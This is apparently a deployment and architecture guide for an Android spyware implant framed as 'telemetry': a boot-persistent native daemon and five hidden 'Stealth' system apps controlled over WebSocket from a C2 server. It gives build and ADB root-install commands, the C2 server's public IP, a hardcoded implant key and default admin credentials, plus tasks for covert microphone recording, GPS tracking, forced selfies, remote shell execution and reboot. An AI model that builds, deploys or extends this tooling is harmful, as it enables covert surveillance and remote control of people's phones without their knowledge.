# CloverProject v3.7 — Deployment & Architecture Guide

Android system-level telemetry stack: native `reporter` daemon, five priv-app APKs, and a FastAPI C2 server.

---

## On-Device File Map (Android OS)

Every built artifact has a fixed path on the device filesystem. Push these after `adb root && adb remount`.

| Component | Build output | Device path |
|-----------|--------------|-------------|
| Reporter binary | `system/bin/reporter` | `/system/bin/reporter` |
| Init script | `system/etc/init/reporter.rc` | `/system/etc/init/reporter.rc` |
| StealthAlert | `system/priv-app/StealthAlert/StealthAlert.apk` | `/system/priv-app/StealthAlert/StealthAlert.apk` |
| StealthAudio | `system/priv-app/StealthAudio/StealthAudio.apk` | `/system/priv-app/StealthAudio/StealthAudio.apk` |
| StealthGps | `system/priv-app/StealthGps/StealthGps.apk` | `/system/priv-app/StealthGps/StealthGps.apk` |
| StealthMonitor | `system/priv-app/StealthMonitor/StealthMonitor.apk` | `/system/priv-app/StealthMonitor/StealthMonitor.apk` |
| StealthSelfie | `system/priv-app/StealthSelfie/StealthSelfie.apk` | `/system/priv-app/StealthSelfie/StealthSelfie.apk` |

### Runtime / config files (created at runtime)

| Path | Purpose |
|------|---------|
| `/data/local/tmp/c2_url.txt` | WebSocket URL (e.g. `wss://34.68.53.83/ws`) — read by reporter and all APKs |
| `/data/local/tmp/c2_tls_pin.pem` | Optional TLS certificate pin for reporter WS |
| `/data/local/tmp/coords.txt` | GPS lat,lon written by StealthGps |
| `/data/local/tmp/screen_time_minutes.txt` | Today's screen-on minutes (StealthMonitor ScreenTimeService) |
| `/data/local/tmp/mic_record.done` | Mic upload completion marker |
| `/data/local/tmp/gps_errors.txt` | StealthGps error log |
| `/data/local/tmp/audio_errors.txt` | StealthAudio error log |
| `/data/system/reporter.log` | Reporter daemon log |
| `/data/system/ping_interval.txt` | Ping interval override (seconds) |
| `/data/system/packages.list` | Installed apps cache |

### Init service

`reporter.rc` starts `system_telemetry_service` (`/system/bin/reporter`) on boot with `restart` on crash.

---

## Build Instructions

### Prerequisites

- Android NDK r27+ (`$HOME/Android/Sdk/ndk/27.0.12077973`)
- JDK 8+ and Android SDK `build-tools` (for APK signing)
- CMake 3.10+
- Python 3.10+ with venv (server)

### Reporter (arm64-v8a)

```bash
export NDK=$HOME/Android/Sdk/ndk/27.0.12077973
rm -rf build_cpp
cmake -B build_cpp \
  -DCMAKE_TOOLCHAIN_FILE=$NDK/build/cmake/android.toolchain.cmake \
  -DANDROID_ABI=arm64-v8a \
  -DANDROID_PLATFORM=android-30 \
  -DCMAKE_BUILD_TYPE=Release
cmake --build build_cpp --target reporter -j$(nproc)
cp build_cpp/reporter system/bin/reporter
chmod +x system/bin/reporter
```

The native sources now live under `C++/`, so the CMake targets resolve `C++/reporter.cpp`, `C++/updater.cpp`, and `C++/json_escape_utils_test.cpp`.

> **Note:** `ANDROID_PLATFORM=android-30` is required for AAudio and ixwebsocket (`pthread_cond_clockwait`).

### System APKs

```bash
for app in StealthAlertApp StealthAudioApp StealthGpsApp StealthMonitorApp StealthSelfieApp; do
  echo "Build APK from StealthAppsSourceCode/$app"
done
```

The app source trees live under `StealthAppsSourceCode/`, and the install helpers in `scripts/` push the resulting APKs into `/system/priv-app/`.

### C2 Server

```bash
cd web
python3 -m venv venv
./venv/bin/pip install -r requirements.txt
./venv/bin/uvicorn main:app --host 0.0.0.0 --port 8000
```

Environment variables (recommended for production):

| Variable | Default | Description |
|----------|---------|-------------|
| `ADMIN_USERNAME` | `admin` | Dashboard login |
| `ADMIN_HASH` | SHA-256 of `1234` | Change before deploy |
| `IMPLANT_KEY` | `DeltaForce2027` | Must match reporter + APKs |

---

## Push to Device (ADB)

```bash
# Connect device via USB, enable USB debugging
adb devices
adb root && adb remount

# Native daemon + init
adb push system/bin/reporter /system/bin/reporter
adb push system/etc/init/reporter.rc /system/etc/init/reporter.rc
adb shell chmod 755 /system/bin/reporter

# Priv-apps
adb push system/priv-app/StealthAlert/StealthAlert.apk /system/priv-app/StealthAlert/
adb push system/priv-app/StealthAudio/StealthAudio.apk /system/priv-app/StealthAudio/
adb push system/priv-app/StealthGps/StealthGps.apk /system/priv-app/StealthGps/
adb push system/priv-app/StealthMonitor/StealthMonitor.apk /system/priv-app/StealthMonitor/
adb push system/priv-app/StealthSelfie/StealthSelfie.apk /system/priv-app/StealthSelfie/

# C2 URL (point device at your server)
adb shell "echo 'wss://YOUR_SERVER_IP/ws' > /data/local/tmp/c2_url.txt"

adb reboot
```

Or run the helper script: `./scripts/push_to_device.sh`

Related helpers:

- `./scripts/install_system_apps_no_reboot.sh` installs the APKs and privileged-permissions whitelist without rebooting.
- `./scripts/enable_implant.sh` restores the reporter, whitelist, and system apps.
- `./scripts/disable_implant.sh` removes the reporter, whitelist, and system apps.
- `./scripts/pause_implant.sh` stops the running service and sets the disable flag.
- `./scripts/resume_implant.sh` clears the disable flag and restarts the service.

For local dev with USB tethering: `adb reverse tcp:8000 tcp:8000`

---

## Google Cloud VM Server

| Setting | Value |
|---------|-------|
| Instance | `instance-20260604-093230` |
| Zone | `us-central1-a` |
| Public IP | `34.68.53.83` | \\ could change in future
| Service user | `kaijakaija88` |
| App path | `/home/kaijakaija88/android-telemetry-server/web` |
| systemd unit | `android-telemetry-server.service` (binds `0.0.0.0:8000`) |

Deploy updated server code:

```bash
chmod +x ./scripts/deploy_server_gce.sh
./scripts/deploy_server_gce.sh
```

Manual steps:

```bash
gcloud compute scp web/main.py instance-20260604-093230:/tmp/ --zone=us-central1-a
gcloud compute ssh instance-20260604-093230 --zone=us-central1-a -- \
  "sudo cp /tmp/main.py /home/kaijakaija88/android-telemetry-server/web/main.py && \
   sudo chown kaijakaija88:kaijakaija88 /home/kaijakaija88/android-telemetry-server/web/main.py && \
   sudo systemctl restart android-telemetry-server"
```

Set device C2 URL to: `wss://34.68.53.83/ws` (or your reverse-proxy hostname).

---

## Architecture Overview

```
┌─────────────────┐     WebSocket (wss)      ┌──────────────────┐
│  reporter       │◄────────────────────────►│  web/main.py     │
│  /system/bin/   │     implant_key auth     │  FastAPI + SQLite│
└────────┬────────┘                          └──────────────────┘
         │ am broadcast / start-foreground-service
    ┌────┴────┬──────────┬───────────┬────────────┐
    ▼         ▼          ▼           ▼            ▼
 StealthAudio StealthGps StealthMonitor StealthSelfie StealthAlert
 (audio blast) (GPS)     (screen log)   (selfie)      (overlay alert)
```

### Task flow examples

| C2 task | Handler |
|---------|---------|
| `audio_blast` | reporter → StealthAudio FGS (types 1–3) |
| `mic_record` | reporter → AAudio → `/data/local/tmp/mic.wav` → WS upload |
| `gps_track` | reporter → `am start-foreground-service` StealthGps |
| `force_selfie` | reporter → StealthSelfie verify mode |
| `shell_cmd` | reporter fork/exec, result via WS |
| `power_cmd` | reporter → `reboot` / `shutdown` |

---
